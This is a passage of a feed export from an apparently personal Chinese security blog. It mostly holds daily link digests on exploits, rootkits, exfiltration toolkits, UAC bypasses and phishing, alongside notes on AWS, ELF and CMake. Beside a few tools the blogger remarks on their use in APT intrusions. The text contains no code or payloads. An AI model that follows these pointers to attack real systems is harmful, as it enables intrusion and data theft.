rootkithttps://github.com/f0rb1dd3n/Reptile其它好久没看书了，主要是一直埋在项目里面，最近不怎么忙了，继续看看书]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171028安全动态]]></title>
    <url>%2F2017%2F10%2F28%2F20171028%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[安全动态 黑客适用的贝叶斯数学https://camdavidsonpilon.github.io/Probabilistic-Programming-and-Bayesian-Methods-for-Hackers/ 新的代码注入技巧http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/ H2HC大会黑客样例代码https://github.com/joaomatosf/JavaDeserH2HC 舰船卫星通信系统中现后门https://www.bleepingcomputer.com/news/security/backdoor-account-found-in-popular-ship-satellite-communications-system 微软公布其开源扫描工具Sonarhttps://github.com/sonarwhal/sonar 基于欺诈的检测技术https://github.com/0x4D31/deception-as-detection 1这个挺有意思 社交应用Sarahah分析https://scotthelme.co.uk/sarahah/ 戴尔对一个关键域名失去控制长达一个月之久https://krebsonsecurity.com/2017/10/dell-lost-control-of-key-customer-support-domain-for-a-month-in-2017/ Snatchloader分析https://www.arbornetworks.com/blog/asert/snatchloader-reloaded/ 微软Windows10加入反勒索软件特性https://www.bleepingcomputer.com/news/microsoft/windows-10s-controlled-folder-access-anti-ransomware-feature-is-now-live/ 1good news 模糊了就完了？针对模糊的二维码逆推！https://medium.freecodecamp.org/lets-enhance-how-we-found-rogerkver-s-1000-wallet-obfuscated-private-key-8514e74a5433 1不错的文章，新的攻击思路 WAF与静态统计分析http://blog.ptsecurity.com/2017/10/do-wafs-dream-of-static-analyzers.html 反射PE打包：新的打包方式介绍https://pentest.blog/introducing-new-packing-method-first-reflective-pe-packer/ 对于Redis用户来说，本地运行可能是一个主要的安全风险https://blog.bugreplay.com/2017/05/for-users-of-redis-running-locally-can-be-dangerous.html 使用DDE实现MSWord脚本注入 docker-onion-nmap：使用nmap再Tor网络上扫描隐藏的”onion”服务https://github.com/milesrichardson/docker-onion-nmap 泄露文档表明NSA早已开始利用KRACK攻击http://securityaffairs.co/wordpress/64601/hacking/krack-attack-nsa.html 链接劫持——过期链接利用https://edoverflow.com/2017/broken-link-hijacking/ 1还有这种操作？ Shodan检查脚本https://github.com/juliocesarfort/netscreen-shodan-scanner Apache James 3.0.1 JMX Server Deserialization 反序列化漏洞分析https://nickbloor.co.uk/2017/10/22/analysis-of-cve-2017-12628/]]></content>
  </entry>
  <entry>
    <title><![CDATA[堆溢出利用笔记]]></title>
    <url>%2F2017%2F10%2F28%2F%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[####referenceDance In Heap（二）：一些堆利用的方法（上） 堆溢出之unlink的利用Linux堆内存管理深入分析]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171025安全动态]]></title>
    <url>%2F2017%2F10%2F25%2F20171025%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[安全动态 专注 Hacking 大型多用户角色扮演游戏的 20 年，来自 DEFCon 25，视频https://www.youtube.com/watch?v=PfbMZJsb1cQ 微软 Office DDEAUTO 攻击方式出现之后，大多数杀软引擎的检测方法是基于 YARA 规则。SensePost 的研究员昨天又写了一篇 Blog，谈 Word 样本的混淆可以绕过这种基于 YARA 的检测https://staaldraad.github.io/pentest/phishing/dde/2017/10/23/msword-field-codes/ MWR Labs 昨天开源了它们的 macOS Kernel Fuzzerhttps://github.com/mwrlabs/OSXFuzz ZTE ZXR10 路由器多个安全漏洞披露https://blogs.securiteam.com/index.php/archives/3495 Amber - 一种新的 PE 壳 - 反射式 PE 壳https://pentest.blog/introducing-new-packing-method-first-reflective-pe-packer/ 我是如何恢复一张模糊处理后的比特币钱包私钥二维码照片的https://medium.freecodecamp.org/lets-enhance-how-we-found-rogerkver-s-1000-wallet-obfuscated-private-key-8514e74a5433 reflector - 在浏览网站时实时监测反射型 XSS 页面的 BurpSuite 插件https://github.com/elkokc/reflector/ XSLT 服务端注入攻击介绍https://www.contextis.com/blog/xslt-server-side-injection-attacks 利用共享文件夹中的 SCF 文件偷 NTLM 认证 Hash，这是微软 10 月份补丁的一个可选更新（ADV170014）。条件是被攻击用户创建了一个无密码的共享文件夹http://www.sysadminjd.com/adv170014-ntlm-sso-exploitation-guide/ 偏执的iOS逆向研究员：收集全版本的macOS iOS+越狱+内核调试http://www.freebuf.com/articles/rookie/151326.html 结合一个野外样本构造一个cve-2016-7193弹计算器的利用https://mp.weixin.qq.com/s/dzlvMaXMV_LPwqxYnYrdDw uncaptcha - 对抗 Google 音频验证码的工具，介绍中称有 85% 的正确率https://github.com/ecthros/uncaptcha 前端防御从入门到弃坑–CSP变迁https://paper.seebug.org/423/ Reptile - LKM Linux Rootkithttp://www.kitploit.com/2017/10/reptile-lkm-linux-rootkit.html Typecho 前台 getshell 漏洞分析https://paper.seebug.org/424/ 绕过 Microsoft Autoruns 启动项检测的技巧https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/ Harioboy水坑攻击这点事http://www.freebuf.com/articles/terminal/151456.html CVE-2017-12629 - Apache Solr XXE &amp; RCE 漏洞分析https://paper.seebug.org/425/ 通过 XSS 漏洞盗取 Amazon EC2 Keyshttps://ionize.com.au/stealing-amazon-ec2-keys-via-xss-vulnerability/ SecureLayer7 对 KeystoneJS 的渗透测试报告https://securelayer7.net/download/pdf/KeystoneJS-Pentest-Report-SecureLayer7.pdf 1学习一下老外的渗透测试报告 一种深度隐蔽的域后门方式http://bobao.360.cn/learning/detail/4599.html Windows数字签名伪造http://wiki.ioin.in/post/group/kp9A]]></content>
  </entry>
  <entry>
    <title><![CDATA[amazon云扩容]]></title>
    <url>%2F2017%2F10%2F22%2Famazon%E4%BA%91%E6%89%A9%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[前言 用了亚马逊的云，但是最近8G的存储不够了。看了一下，好像有没有什么可删除的东西了。然后查了一下，原来亚马逊云是可以扩容的，暂时还不知道扩容收不收费。。为什么要记录一下呢，因为这里有一个小坑1234按照参考1中的方法，前面几个步骤没有问题，但是最后就是报错，大概是找不到快照中的对应的目录，原来是在挂载卷的时候，目录选错了，设置成这个就可以了。/dev/sda1(见参考2).参考：1.http://naonao.blog.51cto.com/1135983/15579942.https://stackoverflow.com/questions/6151695/ec2-instance-on-amazon-and-i-am-greeted-with-no-space-left-on-the-disk 更新 国内的文章真是坑啊，参考1的步骤是有问题的，建议还是用第二个参考链接，参考1的方法，没有先deteach掉volume就创建快照了，这种方法会导致后面启动实例失败，按照参考2的步骤来就没有问题。]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171021安全动态]]></title>
    <url>%2F2017%2F10%2F21%2F20171021%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[安全动态 OSX平台Proton后门恶意软件——供应链攻击 Blockchains（区块链）是什么https://unwttng.com/what-is-a-blockchain 地下暗流：揭秘控制百万肉鸡的GhostFrameworkhttp://www.freebuf.com/articles/terminal/150360.html 【开发利器】中国国内可用API合集https://microzz.com/2017/02/03/API/ windows命令执行漏洞不会玩？ 看我！https://evi1cg.me/archives/remote_exec.html Apache Solr XML外部实体扩展(XXE)及远程代码执行(CVE-2017-12629)http://liehu.tass.com.cn/archives/861 蜜罐与内网安全从0到1（一）https://sosly.me/index.php/2017/08/23/goldenspark1/ CAT文件数字签名使用技巧https://3gstudent.github.io/3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/ 看我如何发现Yahoo! Guesthouse 的SSRF漏洞&#x68;&#116;&#116;&#x70;&#115;&#x3a;&#47;&#x2f;&#109;&#101;&#100;&#105;&#117;&#x6d;&#46;&#x63;&#111;&#x6d;&#47;&#x40;&#x74;&#104;&#51;&#103;&#51;&#x6e;&#116;&#x33;&#x6c;&#47;&#104;&#x6f;&#119;&#x2d;&#105;&#45;&#102;&#111;&#117;&#110;&#100;&#45;&#x61;&#x6e;&#x2d;&#x73;&#x73;&#x72;&#x66;&#45;&#105;&#x6e;&#x2d;&#121;&#x61;&#x68;&#111;&#x6f;&#45;&#x67;&#117;&#101;&#115;&#x74;&#104;&#x6f;&#x75;&#115;&#x65;&#45;&#114;&#x65;&#x63;&#x6f;&#110;&#x2d;&#x77;&#x69;&#x6e;&#115;&#45;&#56;&#55;&#x32;&#50;&#x36;&#55;&#50;&#x65;&#52;&#49;&#x64;&#52; 使用NtCreateThreadEx/QueueUserAPC/SetThreadContext/SetWindowsHookEx进行DLL注入https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Stage-RemoteDll.ps1 1还没用过powershell这种语言进行dll注入 BaRMIe - Java RMI Enumeration And Attack Toolhttp://www.kitploit.com/2017/10/barmie-java-rmi-enumeration-and-attack.html Blazy ——登录爆破工具（同时可检测CSRF, Clickjacking, Cloudflare and WAF）http://www.kitploit.com/2017/10/blazy-modern-login-bruteforcer-which.html https://github.com/ak1t4/open-redirect-scannerhttps://github.com/ak1t4/open-redirect-scanner 1这个用来测试url跳转漏洞不错 加拿大间谍机构发布其网络防御工具https://www.hackread.com/canadas-spy-agency-releases-its-cyber-defense-tool-for-public/ 1好像都是python的？ 如何通过USB完全接管系统http://blog.ptsecurity.com/2017/10/how-to-obtaining-full-system-access-via.html 看我如何一步一步发现TP-Link路由器的远程代码执行(CVE-2017-13772)https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/ Seccubus：简易自动漏洞扫描、报告、分析工具（可结合Nessus、OpenVAS、Nikto、NMap等）http://www.kitploit.com/2017/10/seccubus-easy-automated-vulnerability.html其它我在平安的两年使用Volatility从memory dump获得密码内存取证工具 volatility 使用说明ssdeep检测webshell并通过OSSEC告警]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171016安全动态]]></title>
    <url>%2F2017%2F10%2F16%2F20171016%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[安全动态 ASLRay - 利用堆喷射绕过 Linux ELF x32/x64 ASLR 防御https://github.com/cryptolok/ASLRay fzf - UNIX 命令行版本的模糊命令、文件、进程搜索工具https://github.com/junegunn/fzf Adobe ColdFusion 反序列化远程代码执行漏洞利用 (CVE-2017-11283, CVE-2017-11238)https://nickbloor.co.uk/2017/10/13/adobe-coldfusion-deserialization-rce-cve-2017-11283-cve-2017-11238/ 中兴云桌面 ZTE uSmartView DLL 劫持漏洞https://blogs.securiteam.com/index.php/archives/3457 从 Windows 7 开始引入的 Windows API Sets schema DLL 跳转机制是怎么回事儿https://lucasg.github.io/2017/10/15/Api-set-resolution/ Mac OS X 10.12隔离机制绕过漏洞，该漏洞允许攻击者绕过Apple的隔离机制，不受任何限制执行任意JavaScript代码。前段时间推送过这篇公告的英文版（ https://blogs.securiteam.com/index.php/archives/3449 ），这次是中文版：https://blogs.securiteam.com/index.php/archives/3481 SC-A-Make：滥用CMake提供的某些命令（执行进程、文件下载）可以执行恶意操作https://github.com/darx0r/SC-A-Make Mac取证的常规方法https://drive.google.com/file/d/0B89Qs1PX_ZSEX1Q2U1gtTkdnZFk/view DET (extensible) Data Exfiltration Toolkithttps://github.com/sensepost/DET 1这个可以用于apt攻击中的信息回传 看我如何破解ATM，并在2分钟内取走100万https://embedi.com/files/white-papers/Hack-ATM-with-an-anti-hacking-feature-and-walk-away-with-1M-in-2-minutes.pdf Mac取证的常规方法https://drive.google.com/file/d/0B89Qs1PX_ZSEX1Q2U1gtTkdnZFk/view 深入剖析 WebKithttp://www.starming.com/2017/10/11/deeply-analyse-webkit/ 内存注入利用“WinSxS”绕过UAC保护代码开源https://mp.weixin.qq.com/s/loRg8-FSfDIZg9_YIWurhg 热门游戏被病毒团伙利用 每天感染数十万台电脑https://mp.weixin.qq.com/s/1Y8Pam_RfvbdPnkOIEB9Fg 利用内存破坏实现Python沙盒逃逸https://mp.weixin.qq.com/s/s9fAskmp4Bb42OYsiQJFaw macSubstrate - Substrate for macOS，macOS 系统中跨进程注入代码的工具，类似于 iOS 中的 Cydia Substratehttps://github.com/wzqcongcong/macSubstrate Basics of Tracking WMI Activityhttps://www.darkoperator.com/blog/2017/10/14/basics-of-tracking-wmi-activity Passionfruit：iOS应用黑盒评估工具https://github.com/chaitin/passionfruit Linux Kernel AF_PACKET Use-After-Freehttps://blogs.securiteam.com/index.php/archives/3484 据 ZDI 统计，PDF 阅读器有很大一部分漏洞出在图片转 PDF 的功能中。ZDI 这篇 Blog 介绍如何高效地 Fuzz 和分析 Foxit Reader 的图片转 PDF 特性https://www.zerodayinitiative.com/blog/2017/10/17/wrapping-the-converter-within-foxit-reader 用于辅助 IDA 逆向的多个脚本工具https://github.com/1111joe1111/ida_ea WebUSB：一个网页是如何从你的手机中盗窃数据的（含PoC）http://www.freebuf.com/articles/web/150335.html 1我也发现chrome的这个新特性了。 Aktaion - 用于研究 Exploit 和钓鱼检测的开源机器学习工具和样本https://github.com/jzadeh/Aktaion 路由器 KRACK（CVE-2017-13082）测试脚本，检查路由器（AP）是否受 KRACK 攻击影响https://github.com/vanhoefm/krackattacks-test-ap-ft Hack.lu 2017安全会议演讲视频https://www.youtube.com/playlist?list=PLCxOaebc_2yNlOGhuOjInlJvr0Ktb_FYz Kerberos AD Attacks - Kerberoastinghttps://blog.xpnsec.com/kerberos-attacks-part-1/其它 NuGet包管理器，类似于python的pip，主要用于vc的开发。 CMake support in Visual Studio 2017https://blogs.msdn.microsoft.com/vcblog/2016/10/05/cmake-support-in-visual-studio/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171012安全动态]]></title>
    <url>%2F2017%2F10%2F12%2F20171012%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 攻击Ethereum Smart Contractshttps://www.cryptologie.net/article/423/attacks-on-ethereum-smart-contracts/ Windows hooks检测https://shiftlock.wordpress.com/2011/06/22/windows-hooks-detector/ Bypassing SACL Auditing on LSASS 利用亚马逊 AWS 的 CloudFront CDN 服务劫持某公司的某个子域名https://blog.zsec.uk/subdomainhijack/ 【不需要宏代码，利用 DDE(Dynamic Data Exchange)协议实现 MS Word 的命令执行，弹出计算器】的文章。 Nviso Labs 公开了一个用于用于检测 Office DDE 的 YARA 规则文件https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/ Siofra - 用于发现并利用 Windows DLL 劫持漏洞的工具https://github.com/Cybereason/siofra Pacsec 2017 放出 11 个入选议题介绍https://pacsec.jp/speakers.html 1对第九个议题 Neural Network for Detecting APT Lateral Movement很感兴趣 对 BadBIOS、Evil Maids、Bootkits 及固件级恶意软件的检测，来自 PreOS Security 团队的 Paul Englishhttps://ia601507.us.archive.org/2/items/seagl-2017/seagl-2017.pdf 基于 ADB 调试器卸载 OEM 厂商预装的软件（无需 ROOT）https://www.xda-developers.com/uninstall-carrier-oem-bloatware-without-root-access/ Autorize - BurpSuite 自动化认证测试插件https://github.com/Quitten/Autorize PythonClassInformer - NCC Group 开源的一个 IDA Pro 插件，用于分析并可视化 C++ 的运行时类型信息https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/october/python-class-informer-an-idapython-plugin-for-viewing-run-time-type-information-rtti/ 1好像不错的样子 DependencyCheck - OWASP 开源的一款用于从项目依赖库中找已披露漏洞的工具https://github.com/jeremylong/DependencyCheck CppCon 2017 会议所有的议题资料和视频https://github.com/CppCon/CppCon2017https://www.youtube.com/user/CppCon 《Fuzz or lose: why and how to make fuzzing a standard practice for C++》，来自 CppCon 2017 会议上一篇关于 Fuzz 的议题https://github.com/CppCon/CppCon2017/blob/master/Demos/Fuzz%20Or%20Lose/Fuzz%20Or%20Lose%20-%20Kostya%20Serebryany%20-%20CppCon%202017.pdfhttps://www.youtube.com/watch?v=k-Cv8Q3zWNQ atomic-red-team：Small and highly portable detection tests mapped to the Mitre ATT&amp;CK Framework. 反击爬虫，前端工程师的脑洞可以有多大？http://litten.me/2017/07/09/prevent-spiders/其它c和c++的相互调用USING DEEP LEARNING FOR DOMAIN NAME VALUATION]]></content>
  </entry>
  <entry>
    <title><![CDATA[linux权限提升]]></title>
    <url>%2F2017%2F10%2F10%2Flinux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%2F</url>
    <content type="text"><![CDATA[#### ReferenceLinux提权——利用可执行文件SUID]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171009安全动态]]></title>
    <url>%2F2017%2F10%2F09%2F20171009%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Google 团队对 DNS、DHCP 服务器软件 Dnsmasq 的安全审计报告 所有关于 hash 扩展攻击你所需要知道事https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks Hiding Your Process from Sysinternalshttps://riscybusiness.wordpress.com/2017/10/07/hiding-your-process-from-sysinternals/ Use CLR to bypass UAC，来自 3gstudent’s bloghttps://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-bypass-UAC/ 域渗透——利用DCOM在远程系统执行程序，来自 3gstudent’s bloghttps://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/ XSLT服务端注入攻击 代码审计的常规方法介绍https://pentesterlab.com/exercises/codereview/course 一次误报引发的DNS检测方案的思考：DNS隧道检测平民解决方案http://www.freebuf.com/articles/network/149328.html 代码审计的一些题目https://github.com/CHYbeta/Code-Audit-Challenges cameradar：一款可以攻击CCTV摄像头的工具https://github.com/EtixLabs/cameradar 用radare2逆向工程一个Gameboy ROMhttps://www.megabeets.net/reverse-engineering-a-gameboy-rom-with-radare2/ UserLine - Windows 安全类日志的关联可视化工具https://github.com/THIBER-ORG/userline/blob/master/README.md Awesome-Red-Teaming - 一份红队渗透测试资源列表https://github.com/yeyintminthuhtut/Awesome-Red-Teaming 安能辨我是真假？只需问一问，轻松获得 iOS 用户的 Apple ID 密码https://github.com/KrauseFx/steal.password 使用Sysmon进行Threat Hunting：检测启用宏的Word文档http://syspanda.com/index.php/2017/10/10/threat-hunting-sysmon-word-document-macro/ 深入浅出同源策略https://mp.weixin.qq.com/s?__biz=MzIzOTQ5NjUzOQ==&amp;mid=2247483779&amp;idx=1&amp;sn=eadc694e638cf863f4450f95c1d841d5&amp;chksm=e9287db7de5ff4a1946d024d38c588cb5d0be21e923e1caf55d7bebef2fd52c483e88a2585a8&amp;mpshare=1&amp;scene=23&amp;srcid=1012ymR3Wf6y56Dig1pwdwyG#rd CAT文件数字签名使用技巧https://3gstudent.github.io/3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/ 微软 Office Word 无宏命令执行漏洞http://bobao.360.cn/learning/detail/4526.html 深度学习框架中的魔鬼——探究人工智能系统中的安全问题http://bobao.360.cn/learning/detail/4529.html Pornhub CSV注入漏洞https://blog.zsec.uk/csvhub/其它 一个前端监控框架https://github.com/sensu/uchiwa 编程的智慧http://www.test404.com/post-1487.html 数学和编程http://www.test404.com/post-1486.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[ELF文件学习]]></title>
    <url>%2F2017%2F10%2F08%2FELF%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[前言 ELF(Executable and Linkable Format)可执行和可链接格式。动态链接库 类似于dumpbin，可以使用ldd(print shared object dependencies)命令查看参考这样我们可以看的到， hello的运行用到了我们编写的libmyhello.so这个动态链接库，还用到了libc.so.6这个c语言的标准库。ELF文件格式 readelf命令这个命令应该是最常用的到的，-a 它会显示ELF文件的所有信息。reference二进制中的奥妙：文件结构[工具elfparser](https://github.com/jacob-baines/elfparser)1老外两年前写的，差距好大]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171006安全动态]]></title>
    <url>%2F2017%2F10%2F06%2F20171006%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态都在过十一，好久没更新了。 雅虎承认其30亿用户信息全部被黑http://www.freebuf.com/news/149894.html 注册机音乐随记http://veritas501.space/2017/10/05/%E6%B3%A8%E5%86%8C%E6%9C%BA%E9%9F%B3%E4%B9%90%E9%9A%8F%E8%AE%B0/ Playing with Dynamic symbolic executionhttp://www.miasm.re/blog/2017/10/05/playing_with_dynamic_symbolic_execution.html 黑帽SEO剖析之手法篇http://www.freebuf.com/articles/web/149438.html 黑帽SEO剖析之工具篇http://www.freebuf.com/sectool/149427.html HITB CTF 2017 Pwn题研究http://0x48.pw/2017/08/29/0x39/ Pwnhub 2013的国庆 writeuphttp://0x48.pw/2017/10/04/0x3A/ 代码审计之60度cmshttp://foreversong.cn/archives/697 Apache server security: 10 tips to secure installationhttps://www.acunetix.com/blog/articles/10-tips-secure-apache-installation/ BackdoorCTF 2017-Extends Me-writeuphttps://chybeta.github.io/2017/09/28/BackdoorCTF-2017-Extends-Me-writeup/ Mac OS X 10.12 Quarantine Bypasshttps://blogs.securiteam.com/index.php/archives/3449 从试玩某SF游戏 到修改游戏数据https://bbs.ichunqiu.com/thread-27502-1-1.html 覆盖虚表方式利用栈溢出漏洞http://docs.ioin.in/writeup/blog.csdn.net/_niexinming_article_details_78144301/index.html 从心脏出血到量子安全，OpenSSL到底是怎样的存在？https://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&amp;mid=2651073710&amp;idx=1&amp;sn=cc41779bbe09ce4dc31ed8c61e53dc56&amp;chksm=bd149c7d8a63156b0a1fdac683260ab14dcb118f0f87cddddf46db8dbcd3da788b1fd5e40c99&amp;mpshare=1&amp;scene=23&amp;srcid=1006stEiNm1t7uBRYG6S6E6M#rd Powershell安全最佳实践http://www.4hou.com/data/7849.html 探索C++虚函数在内存中的表现形式及运行机制https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458285608&amp;idx=1&amp;sn=44f34a321ae9819f81b77c8ce0c79b23&amp;chksm=b18146a286f6cfb44139e14dbbc73a51be2b645e8e068d8748be7ca0c830c4f5471aa5916cbf&amp;mpshare=1&amp;scene=23&amp;srcid=1005io6TGKJHY9upwuJJn7AI#rd 一个内存取证框架http://www.rekall-forensic.com PopUnder 研究：Javascript逆向与反逆向http://www.jianshu.com/p/9148d215c119 绕过DKIM验证，伪造钓鱼邮件http://www.4hou.com/web/7857.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[Google c++测试框架]]></title>
    <url>%2F2017%2F09%2F29%2FGTest%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%2F</url>
    <content type="text"><![CDATA[前言 测试并不只是测试工程师的责任，对于开发工程师，为了保证发布给测试环节的代码具有足够好的质量（ Quality ），为所编写的功能代码编写适量的单元测试是十分必要的。 单元测试（ Unit Test ，模块测试）是开发者编写的一小段代码，用于检验被测代码的一个很小的、很明确的功能是否正确，通过编写单元测试可以在编码阶段发现程序编码错误，甚至是程序设计错误。Reference https://usingcpp.wordpress.com/2016/07/23/google-test-and-visual-studio/ https://www.ibm.com/developerworks/cn/linux/l-cn-cppunittest/index.html vs上使用googletest]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170929安全动态]]></title>
    <url>%2F2017%2F09%2F29%2F20170929%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 浏览器中的僵尸网络：了解恶意浏览器扩展引起的威胁(Paper)https://arxiv.org/pdf/1709.09577.pdf Mac OS X 10.12 Quarantine Bypass - macOS 的 rhtmlPlayer.html 存在一个 DOM XSS，攻击者可以利用 rhtmlPlayer.html 实现在无限制的上下文中实现 JavaScript 任意命令执行，譬如直接读 /etc/passwd CyberArk Lab 研究员发现 Windows Defender 在扫描 SMB 共享的文件时存在比较奇怪的行为，利用这个可以 Bypass Windows Defender 的检测https://www.cyberark.com/threat-research-blog/illusion-gap-antivirus-bypass-part-1/ 黑帽SEO剖析之手法篇https://thief.one/2017/09/28/1/ 针对NFS服务的渗透测试指南https://pentestacademy.wordpress.com/2017/09/20/nfs/ 这个Spring高危漏洞，你修补了吗？https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA 借用Microsoft代码签名证书https://blog.conscioushacker.io/index.php/2017/09/27/borrowing-microsoft-code-signing-certificates/ 堆利用——UAF之殇http://bobao.360.cn/learning/detail/4476.html Exploiting JSON CSRFhttps://www.secpulse.com/archives/61297.html 对SUID可提权Root Shell的探究http://www.freebuf.com/articles/system/149118.html 企业环境里该如何管理 PowerShell 的使用，降低因误用带来的风险https://www.nccgroup.trust/uk/our-research/managing-powershell-in-a-modern-corporate-environment/ 来自 subTee 分享的 COM Hijacking 示例代码https://gist.github.com/subTee/91861699acaa1bd0da493c8a79035eb9 Mac固件安全研究https://duo.com/blog/the-apple-of-your-efi-mac-firmware-security-research 安全圈关系可视化分析【安全圈也许就这么大续集】 1这个挺有意思的 利用Flash漏洞传播的小马样本分析（含样本下载）http://bobao.360.cn/learning/detail/4502.html 写给十九大安保应急的兄弟们 来看看DDOS攻击应急预案http://blog.nsfocus.net/ddos-attack-plan/其它 今天居然用到了 腾讯哈勃沙箱https://github.com/Tencent/HaboMalHunter]]></content>
  </entry>
  <entry>
    <title><![CDATA[windows域安全]]></title>
    <url>%2F2017%2F09%2F28%2Fwindows%E5%9F%9F%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[前言 Active Directory = LDAP服务器＋LDAP应用（Windows域控）就是Active Directory先实现一个LDAP服务器，然后自己先用这个LDAP服务器实现了自己的一个具体应用（域控）。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Cmake VS Autotools]]></title>
    <url>%2F2017%2F09%2F28%2FCmakeVSautotools%2F</url>
    <content type="text"><![CDATA[前言最近的项目中遇到了cmake和autotools的转换的问题，这两个东西以前接触的很少，所以需要对cmake和autotools进行一番系统学习。 Cmake使用 wiki关于cmake介绍 官方文档 熟悉某种技术的最好最快的方法还是要通过阅读官方文档:P learning-cmake-a-beginner-s-guide/details CMake 入门实战 windows下使用Cmake 语法简单介绍可以把cmake理解为一种简单的语言，它也有着它的语法和变量。它的语法规则很简单1.变量使用${}方式取值2.指令（参数1 参数2 。。。）3.指令是大小写无关的，参数和变量是大小写敏感的，例如set 和SET 作为指令都是可以的，但是建议全部使用大写的指令。4.cmake的语法还是比较灵活且考虑到了各种情况，比如SET(SOURCES_FILES main.c)也可以写成SET(SOURCES_FILES “main.c”)，但是假设一个源文件中的文件名是fu nc.c（中间有了空格），这个时候就有必要加上双引号了。5.清理工程，跟经典的autotools系列工具一样，make clean可以对构建结果进行清理。6.内部构建和外部构建。内部构建就是直接在根目录下面构建(会在工程目录下产生很多文件，使工程看起来比较乱)，而使用外部构建比如在工程目录下面创建一个build的目录，然后进入build目录下，进行cmake .. 这样生成的文件都在build目录下。推荐是有外部构建，所以一般的构建命令就是进入 build 目录下面，然后 cmake .. make7.注意cmake 是构建项目的过程,是产生Makefile的过程，也就是生成编译指令的过程，这个过程不会包编译的错误。make才是编译和链接的过程，如果你的代码有问题，或者你的编译指令有有问题(比如未包含动态或者静态的lib)这是时候会产生错误。8.ADD_LIBRARY()用来生成动态或者静态链接库的。INCLUDE_DIRECTORY()是用来向工程添加多个特定的头文件搜索路径的，路径之间用空格分开，如果路径中包含了空格，可以使用双引号将它括起来。默认的行为是追加到当前的头文件搜索路径的后面。LINK_DIRECTORIES()添加非标准的共享库搜索路径，TARGET_LINK_LIBRARIES(target library1 library2),这个指令可以用来为target添加需要连接的共享库.测试代码见githubautotools使用 使用autotools生成Makefile学习笔记 autotools入门使用libtool创建库使用libtool创建库其它cmake导致的命令执行问题automake 和 autoconf 使用简明教程Referencehttps://www.youtube.com/watch?v=gYmgbqGfv-8https://stackoverflow.com/questions/7132862/tutorial-for-converting-autotools-to-cmake]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170927安全动态(以后每2天更新)]]></title>
    <url>%2F2017%2F09%2F27%2F20170927%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81-%E4%BB%A5%E5%90%8E%E6%AF%8F2%E5%A4%A9%E6%9B%B4%E6%96%B0%2F</url>
    <content type="text"><![CDATA[安全动态 通过数据包端口号进行数据渗出：PacketKnockOuthttps://n0where.net/data-exfiltration-via-packet-port-numbers-packetknockout/ 1搞apt的可以研究一下 一款智能家居设备的远程命令执行漏洞分析https://forsec.nl/2017/09/smart-home-remote-command-execution-rce/ BlobRunner - 在恶意软件分析过程中快速调试 ShellCode 的工具https://github.com/OALabs/BlobRunner Awesome-MitM - GitHub 上一些不错的网络中间人攻击框架收集https://github.com/Chan9390/Awesome-MitM 使用 IDA 调试 iOS 程序的步骤http://blog.csdn.net/proteas/article/details/78083512 JEB2插件教程之一https://blog.flanker017.me/writing-jeb2-plugin/ 一个介绍主流漏洞悬赏平台、安全书籍、常见安全工具及漏洞类型的CheatSheethttps://github.com/EdOverflow/bugbounty-cheatsheet BypassD盾IIS防火墙SQL注入防御（多姿势） 开源无效流量检测项目http://nameles.org/ 参数特定XSS的故事http://www.noob.ninja/2017/09/story-of-parameter-specific-xss.html 各种应用加密加固https://bettercrypto.org/static/applied-crypto-hardening.pdf 基于 Windows ETW（事件日志）的入侵检测，来自微软研究员在 